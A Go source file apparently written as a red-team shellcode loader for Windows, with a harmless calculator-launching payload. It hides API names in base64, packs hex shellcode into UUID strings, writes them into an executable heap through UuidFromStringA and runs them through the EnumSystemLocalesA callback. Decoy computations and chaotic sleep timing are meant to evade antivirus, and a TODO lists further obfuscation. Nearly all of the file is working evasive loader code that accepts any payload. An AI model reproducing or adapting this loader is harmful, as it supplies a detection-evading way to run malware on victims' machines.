/*
Pop-calc shellcode

TODO: 
  - String obfuscation
  - Rename variables and functions
  - Decryption routine for the hex shellcode (custom xor-routine combined with aes)
  - Additional obfuscation techniques (parse PEB to find func addrs)
*/

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"math"
	"math/rand"
	"reflect"
	"time"
	"unicode"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/google/uuid"
)

type TreeNode struct {
	Val   int
	Left  *TreeNode
	Right *TreeNode
}

func generateRandomString(length int) string {
	letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	result := make([]byte, length)
	for i := range result {
		result[i] = letters[rand.Intn(len(letters))]
	}
	return string(result)
}

func doRandomMath() int {
	num1 := rand.Intn(100)
	num2 := rand.Intn(100)
	switch rand.Intn(4) {
	case 0:
		result := num1 + num2
		return result
	case 1:
		result := num1 - num2
		return result
	case 2:
		result := num1 * num2
		return result
	case 3:
		result := num1 / num2
		return result
	}
	return 0
}

func generateRandomBinaryTree(depth int) *TreeNode {
	if depth == 0 {
		return nil
	}
	node := &TreeNode{Val: rand.Intn(100)}
	node.Left = generateRandomBinaryTree(depth - 1)
	node.Right = generateRandomBinaryTree(depth - 1)
	return node
}

func generateRandomMatrix(rows, cols int) [][]float64 {
	matrix := make([][]float64, rows)
	for i := range matrix {
		matrix[i] = make([]float64, cols)
		for j := range matrix[i] {
			matrix[i][j] = rand.Float64()
		}
	}
	return matrix
}

// Add Lorenz system implementation
type Lorenz struct {
	X, Y, Z float64
}

func (l *Lorenz) Step(dt float64) {
	const (
		sigma = 10
		rho   = 28
		beta  = 8.0 / 3.0
	)

	x, y, z := l.X, l.Y, l.Z
	l.X += dt * sigma * (y - x)
	l.Y += dt * (x*(rho-z) - y)
	l.Z += dt * (x*y - beta*z)
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

type OpPredicates struct {
	isPrimeLengthFunc  func([]byte) bool
	isFactorFunc       func(int, int) bool
	isAllUppercaseFunc func(string) bool
	isOddSumFunc       func([]byte) bool
	isPalindromeFunc   func(string) bool
}

func (op *OpPredicates) Init() {
	op.isPrimeLengthFunc = func(b []byte) bool {
		l := len(b)
		if l < 2 {
			return false
		}
		for i := 2; i <= int(math.Sqrt(float64(l))); i++ {
			if l%i == 0 {
				return false
			}
		}
		return true
	}

	op.isFactorFunc = func(a, b int) bool {
		if b%a == 0 {
			return true
		}
		return false
	}

	op.isAllUppercaseFunc = func(s string) bool {
		for _, c := range s {
			if !unicode.IsUpper(c) {
				return false
			}
		}
		return true
	}

	op.isOddSumFunc = func(b []byte) bool {
		var sum int
		for _, v := range b {
			sum += int(v)
		}
		return sum%2 == 1
	}

	op.isPalindromeFunc = func(s string) bool {
		for i := 0; i < len(s)/2; i++ {
			if s[i] != s[len(s)-i-1] {
				return false
			}
		}
		return true
	}
}

func (op *OpPredicates) IsPrimeLength(b []byte) bool {
	return op.isPrimeLengthFunc(b)
}

func (op *OpPredicates) IsFactor(a, b int) bool {
	return op.isFactorFunc(a, b)
}

func (op *OpPredicates) IsAllUppercase(s string) bool {
	return op.isAllUppercaseFunc(s)
}

func (op *OpPredicates) IsOddSum(b []byte) bool {
	return op.isOddSumFunc(b)
}

func (op *OpPredicates) IsPalindrome(s string) bool {
	return op.isPalindromeFunc(s)
}

func loadFuncs() (*windows.LazyProc, *windows.LazyProc, *windows.LazyProc, *windows.LazyProc) {
	funcNameMap := map[string]string{
		"kc": "a2VybmVsMzI=",
		"rc": "UnBjcnQ0LmRsbA==",
		"hc": "SGVhcENyZWF0ZQ==",
		"ha": "SGVhcEFsbG9j",
		"es": "RW51bVN5c3RlbUxvY2FsZXNB",
		"uf": "VXVpZEZyb21TdHJpbmdB",
	}

	decodeFuncName := func(encodedName string) string {
		decodedName, err := base64.StdEncoding.DecodeString(encodedName)
		if err != nil {
			return encodedName
		}
		return string(decodedName)
	}

	libs := map[string]*windows.LazyDLL{
		"kc": windows.NewLazySystemDLL(decodeFuncName(funcNameMap["kc"])),
		"rc": windows.NewLazySystemDLL(decodeFuncName(funcNameMap["rc"])),
	}

	getFunc := func(libName, funcName string) *windows.LazyProc {
		lib := libs[libName]
		return lib.NewProc(decodeFuncName(funcNameMap[funcName]))
	}

	return getFunc("kc", "hc"), getFunc("kc", "ha"), getFunc("kc", "es"), getFunc("rc", "uf")
}

func main() {
	decodeAndExecuteShellcode := func(shellcodeHex string, execute func([]byte) error) error {
		shellcode, err := hex.DecodeString(shellcodeHex)
		if err != nil {
			return fmt.Errorf("[!] Error decoding shellcode: %s", err)
		}

		if reflect.TypeOf(execute).Kind() != reflect.Func {
			return fmt.Errorf("[!] Execute parameter must be a function")
		}

		defer func() {
			if r := recover(); r != nil {
				log.Println("[!] Panic occurred:", r)
			}
		}()

		return execute(shellcode)
	}

	convertAndLoadUUIDs := func(shellcode []byte) ([]string, error) {
		uuids, err := shellcodeToUUID(shellcode)
		if err != nil {
			return nil, err
		}

		heapCreate, heapAlloc, enumSystemLocalesA, uuidFromString := loadFuncs()

		if heapCreate == nil || heapAlloc == nil || enumSystemLocalesA == nil || uuidFromString == nil {
			return nil, fmt.Errorf("[!] Error loading functions")
		}

		heapOp := func(op interface{}) (uintptr, error) {
			switch operation := op.(type) {
			case string:
				if operation == "create" {
					heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
					if heapAddr == 0 {
						return 0, fmt.Errorf("There was an error calling the HeapCreate function:\r\n%s", err)
					}
					return heapAddr, nil
				}
			case uintptr:
				addr, _, err := heapAlloc.Call(operation, 0, 0x00100000)
				if addr == 0 {
					return 0, fmt.Errorf("There was an error calling the HeapAlloc function:\r\n%s", err)
				}
				return addr, nil
			}
			return 0, fmt.Errorf("Unsupported operation")
		}

		heapAddr, err := heapOp("create")
		if err != nil {
			return nil, err
		}

		addr, err := heapOp(heapAddr)
		if err != nil {
			return nil, err
		}

		addrPtr := addr
		for _, uuid := range uuids {
			u := append([]byte(uuid), 0)
			rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
			if rpcStatus != 0 {
				return nil, fmt.Errorf("There was an error calling UuidFromStringA:\r\n%s", err)
			}
			addrPtr += 16
		}

		ret, _, err := enumSystemLocalesA.Call(addr, 0)
		if ret == 0 {
			return nil, fmt.Errorf("EnumSystemLocalesA GetLastError: %s", err)
		}

		return uuids, nil
	}

	shellcodeHex := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
	err := decodeAndExecuteShellcode(shellcodeHex, func(shellcode []byte) error {
		_, err := convertAndLoadUUIDs(shellcode)
		return err
	})
	if err != nil {
		log.Fatal(err)
	}
}

func shellcodeToUUID(shellcode []byte) ([]string, error) {
	padShellcode := func(sc []byte) []byte {
		if l := len(sc); l%16 != 0 {
			return append(sc, bytes.Repeat([]byte{0x90}, 16-l%16)...)
		}
		return sc
	}

	segmentToUUID := func(segment []byte) (string, error) {
		var uuidBytes []byte

		buf := make([]byte, 8)
		binary.LittleEndian.PutUint32(buf[:4], binary.BigEndian.Uint32(segment[:4]))
		binary.LittleEndian.PutUint16(buf[4:6], binary.BigEndian.Uint16(segment[4:6]))
		binary.LittleEndian.PutUint16(buf[6:8], binary.BigEndian.Uint16(segment[6:8]))

		uuidBytes = append(uuidBytes, buf...)
		uuidBytes = append(uuidBytes, segment[8:]...)

		// Create UUID from bytes
		u, err := uuid.FromBytes(uuidBytes)
		if err != nil {
			return "", fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
		}
		return u.String(), nil
	}

	shellcode = padShellcode(shellcode)

	var uuids []string

	lorenz := Lorenz{X: 1.0, Y: 1.0, Z: 1.0}

	op := OpPredicates{}
	op.Init()

	for i := 0; i < len(shellcode); i += 16 {
		lorenz.Step(0.01)

		sleepTime := time.Duration((lorenz.X*1000)+1000) * time.Microsecond

		time.Sleep(sleepTime)

		uuid, err := segmentToUUID(shellcode[i : i+16])
		if err != nil {
			return nil, err
		}
		uuids = append(uuids, uuid)

		isPrimeLen := op.IsPrimeLength([]byte(uuid))
		isFactor := op.IsFactor(3, len(uuid))
		isAllUpper := op.IsAllUppercase(uuid)
		isOddSum := op.IsOddSum([]byte(uuid))
		isPalindrome := op.IsPalindrome(uuid)

		switch {
		case isPrimeLen && isFactor:
			time.Sleep(sleepTime)
			binaryTreePtr := generateRandomBinaryTree(5)
			if binaryTreePtr != nil {
				time.Sleep(sleepTime)
			}

		case isAllUpper:
			time.Sleep(sleepTime)
			matrix := generateRandomMatrix(5, 5)
			if matrix != nil {
				time.Sleep(sleepTime)
			}
		case isOddSum && isPalindrome:
			time.Sleep(sleepTime)
			randString := generateRandomString(5)
			if randString != "" {
				time.Sleep(sleepTime)
			}
		default:
			time.Sleep(sleepTime)
			doRandomMath()
		}
	}

	return uuids, nil
}
